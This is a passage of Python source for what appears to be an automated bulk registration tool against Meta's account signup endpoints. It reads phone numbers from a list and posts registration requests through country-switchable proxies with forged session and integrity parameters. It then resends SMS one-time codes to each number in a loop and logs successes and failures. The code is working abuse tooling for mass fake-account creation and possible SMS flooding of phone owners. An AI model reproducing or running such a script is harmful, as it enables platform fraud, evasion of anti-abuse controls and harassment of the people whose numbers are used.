        marketing_data = {
            'date_of_birth': dob,
            **build_common_params(auth_hs, auth_rev, s_val_marketing, auth_hsi, auth_dyn, auth_csr,
                                  auth_comet_req, auth_lsd, auth_jazoest, auth_spin_b, auth_spin_t, auth_ccg,
                                  auth_hsdp, auth_hblp, auth_sjsp),
        }
        try:
            session.post('https://auth.meta.com/api/eligible-for-default-marketing-opt-in/', headers=step6_headers, data=marketing_data, timeout=15)
        except Exception:
            pass

        # Step 6.6: Check Profile
        s_val_check_profile = generate_s_val()
        check_profile_data = {
            'client_consent_timestamp': str(int(time.time())),
            'display_name': '',
            'foa_import_source_name': '',
            'foa_import_source_obid': '',
            'nta_disclosures_summary_cms_id': '',
            'picture_source': '',
            'tos_cms_id': '957798449862312',
            'username': username,
            'caa_event_flow': 'ntm',
            'csi': csi,
            'source_app_id': '1522763855472543',
            'waterfall_id': waterfall_id,
            'is_submit': 'true',
            **build_common_params(auth_hs, auth_rev, s_val_check_profile, auth_hsi, auth_dyn, auth_csr,
                                  auth_comet_req, auth_lsd, auth_jazoest, auth_spin_b, auth_spin_t, auth_ccg,
                                  auth_hsdp, auth_hblp, auth_sjsp),
            '__req': '21',
        }
        try:
            profile_resp = session.post('https://auth.meta.com/api/kadabra/check_profile/', headers=step6_headers, data=check_profile_data, timeout=15)
        except Exception:
            pass

        # Step 7: Submit registration (triggers OTP)
        s_val = generate_s_val()
        qpl_join_id = generate_qpl_join_id()

        step7_headers = {
            **api_headers,
            'origin': 'https://auth.meta.com',
            'referer': auth_referer,
            'x-fb-lsd': auth_lsd,
        }

        step7_data = {
            'client_consent_timestamp': str(int(time.time())),
            'display_name': '',
            'foa_import_source_name': '',
            'foa_import_source_obid': '',
            'nta_disclosures_summary_cms_id': '',
            'picture_source': '',
            'tos_cms_id': '957798449862312',
            'username': username,
            'consent_version': '',
            'contact_point': contact_point,
            'contact_point_type': 'PHONE_NUMBER',
            'csi': csi,
            'date_of_birth': dob,
            'device_id': req_device_id,
            'fb_encrypted_access_token': '',
            'fb_oidc_access_token': '',
            'first_name': req_first_name,
            'google_id_token': '',
            'has_youth_consent': 'false',
            'ig_encrypted_access_token': '',
            'ig_encrypted_auth_header': '',
            'ig_oidc_access_token': '',
            'last_name': req_last_name,
            'opt_into_marketing': 'false',
            'password': formatted_password,
            'redirect_uri': auth_redirect_uri,
            'reg_integrity': reg_integrity,
            'should_save_credentials': 'true',
            'source_app_id': '1522763855472543',
            'third_party_age_verification_id': '',
            'waterfall_id': waterfall_id,
            'caa_event_flow': '',
            'ntm': '',
            'entry_point': 'login_home',
            'event_client_time': f'{time.time():.3f}',
            'is_kadabra_zero': 'false',
            'reg_navigation_flow_name': 'new_to_family_c50_r1',
            'regulation_jurisdiction': f'["{country_code}"]',
            'qpl_join_id': qpl_join_id,
            **build_common_params(auth_hs, auth_rev, s_val, auth_hsi, auth_dyn, auth_csr,
                                  auth_comet_req, auth_lsd, auth_jazoest, auth_spin_b, auth_spin_t, auth_ccg,
                                  auth_hsdp, auth_hblp, auth_sjsp),
            '__req': '22',
        }

        response = session.post('https://auth.meta.com/login/device-based/kadabra-register-save-credentials/', headers=step7_headers, data=step7_data, timeout=15)

        step7_text = strip_json_prefix(response.text)

        try:
            step7_json = json.loads(step7_text)
            if step7_json.get("error"):
                error_msg = step7_json.get("errorDescription", "Unknown error")
                error_msg_str = str(error_msg).lower()
                if "exist" in error_msg_str or "already" in error_msg_str:
                    update_counter("noacc", number, f"Existing Account! Skipping... [Proxy: {actual_proxy_country}]", YELLOW)
                    save_failed_number(number)
                else:
                    update_counter("failed", number, f"Registration failed! {error_msg}", RED)
                    save_failed_number(number)
                return

            payload = step7_json.get("payload")
            if payload:
                account_id = payload.get("account_id", "")

                if account_id:
                    primary_lang = lang_header.split(',')[0]
                    update_counter("success", number, f"Registration Successful! OTP Sent! ID:{account_id} [Country: {country_code}] [Lang: {primary_lang}] [Proxy: {actual_proxy_country}]", GREEN)
                    save_success_number(number)

                    fb_dtsg = step7_json.get("dtsgToken", "")

                    # Step 8: Resend OTP loop
                    if resend_count > 0:
                        for r_idx in range(resend_count):
                            s_val_new = generate_s_val()

                            resend_headers = {
                                **api_headers,
                                'origin': 'https://auth.meta.com',
                                'referer': auth_referer,
                                'x-fb-lsd': auth_lsd,
                            }
                            
                            resend_variables = {
                                "input": {
                                    "contact_point": {
                                        "sensitive_string_value": contact_point
                                    },
                                    "contact_point_type": "PHONE_NUMBER",
                                    "event_flow": "ntm",
                                    "rl_client_session_id": csi,
                                    "source_app_id": 1522763855472543,
                                    "waterfall_id": waterfall_id,
                                    "actor_id": "0",
                                    "client_mutation_id": str(r_idx + 1)
                                }
                            }

                            resend_data = {
                                'av': '0',
                                'fb_dtsg': fb_dtsg,
                                'fb_api_caller_class': 'RelayModern',
                                'fb_api_req_friendly_name': 'FRLResendOTPMutation',
                                'server_timestamps': 'true',
                                'variables': json.dumps(resend_variables, separators=(',', ':')),
                                'doc_id': '25885129117818218',
                                **build_common_params(auth_hs, auth_rev, s_val_new, auth_hsi, auth_dyn, auth_csr,
                                                      auth_comet_req, auth_lsd, auth_jazoest, auth_spin_b, auth_spin_t, auth_ccg,
                                                      auth_hsdp, auth_hblp, auth_sjsp),
                                '__req': '1k',
                            }

                            try:
                                response = session.post('https://auth.meta.com/api/graphql/', headers=resend_headers, data=resend_data, timeout=15)
                                resend_text = strip_json_prefix(response.text)
                                resend_json = json.loads(resend_text)
                                
                                resend_success = False
                                if "data" in resend_json and "resend_otp" in resend_json["data"]:
                                    resend_success = resend_json["data"]["resend_otp"].get("success", False)
                                
                                if resend_success:
                                    safe_print(f"{GREEN} OTP Resend {r_idx+1}/{resend_count} Successful! [{number}]")
                                else:
                                    error_desc = resend_json.get("errors", [{"message": "Unknown error"}])[0].get("message") if "errors" in resend_json else "Failed"
                                    safe_print(f"{YELLOW} OTP Resend {r_idx+1}/{resend_count} Failed: {error_desc} [{number}]")

                            except Exception as e:
                                safe_print(f"{YELLOW} Resend OTP {r_idx+1} Error: {e} [{number}]")

                            if r_idx < resend_count - 1:
                                delay = round(random.uniform(0.5, 1.2), 2)
                                time.sleep(delay)
                else:
                    errors = payload.get("validation_errors", [])
                    update_counter("failed", number, f"Registration failed! {errors}", RED)
                    save_failed_number(number)
            else:
                update_counter("failed", number, "Registration failed! (payload null)", RED)
                save_failed_number(number)
        except json.JSONDecodeError:
            update_counter("error", number, "Response parse failed!", RED)
            save_failed_number(number)

    except requests.exceptions.ConnectionError as e:
        update_counter("error", number, f"Network error: {str(e)[:30]}...", RED)
        save_failed_number(number)
        time.sleep(2)
        return "RETRY"
    except requests.exceptions.Timeout:
        update_counter("error", number, "Request timeout!", RED)
        save_failed_number(number)
        time.sleep(2)
        return "RETRY"
    except requests.exceptions.RequestException as e:
        update_counter("error", number, f"Request error: {str(e)[:30]}...", RED)
        save_failed_number(number)
        time.sleep(2)
        return "RETRY"
    except Exception as e:
        update_counter("error", number, f"Unexpected error: {str(e)[:30]}...", RED)
        save_failed_number(number)

# ========================================
# main.py
# ========================================
import sys
import time
import os
import hashlib
import json as jsond



def change_proxy_country_tool():
    import re
    clear_logo()
    proxy_file = get_proxy_file_path()
    print(f"\n{GREEN} === Change Proxy Country Code ==={RESET}")
    print(f"{YELLOW} (This will update all entries in {proxy_file}){RESET}\n")
    
    new_code = input(f"{GREEN} [{RED}◆{GREEN}] Enter new 2-letter country code (e.g. US, BD, GB): {EKL} ").strip().upper()
    
    if len(new_code) == 2 and new_code.isalpha():
        file_path = proxy_file
        if not os.path.exists(file_path):
            print(f"\n{RED} Error: {file_path} not found.{RESET}")
            time.sleep(2)
            return

        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
        
        content = re.sub(r'_custom_zone_[a-zA-Z]{2}_st_', f'_custom_zone_{new_code}_st_', content)
        content = re.sub(r'-region-[a-zA-Z]{2}:', f'-region-{new_code}:', content)
        
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(content)
            
        print(f"\n{GREEN} Success! Proxy country code changed to {new_code}.{RESET}")
    else:
        print(f"\n{RED} Invalid input. Exactly 2 letters required.{RESET}")
        
    time.sleep(2.5)

def main_menu():
    verify_auth()
    while True:
        clear_logo()
        print(f" {opt_labels[0]} API Automation (Fast - Meta AI)")
        print(f" {opt_labels[1]} Change Proxy Country")
        print(f" {opt_labels[2]} Exit")
        print(f"{LINE}")

        choice = input(f"{GREEN} [{RED}◆{GREEN}] Select Option {EKL} ").strip()

        if choice in ['1', '01']:
            run()
        elif choice in ['2', '02']:
            change_proxy_country_tool()
        elif choice in ['3', '03']:
            print(f"\n{GREEN} [{RED}◆{GREEN}] Exiting...")
            time.sleep(1)
            sys.exit(0)
        else:
            print(f"\n{RED} Invalid Option! Please try again.")
            time.sleep(1.5)

if __name__ == "__main__":
    try:
        if get_number_file_path() == "Number_List.txt" and not os.path.exists("Number_List.txt"):
            with open("Number_List.txt", "w") as f: pass
        if get_proxy_file_path() == "Proxy_List.txt" and not os.path.exists("Proxy_List.txt"):
            with open("Proxy_List.txt", "w") as f: pass
        main_menu()
    except Exception as e:
        import traceback
        print(f"\nCRITICAL ERROR: {e}")
        traceback.print_exc()
        input("\nPress Enter to exit...")
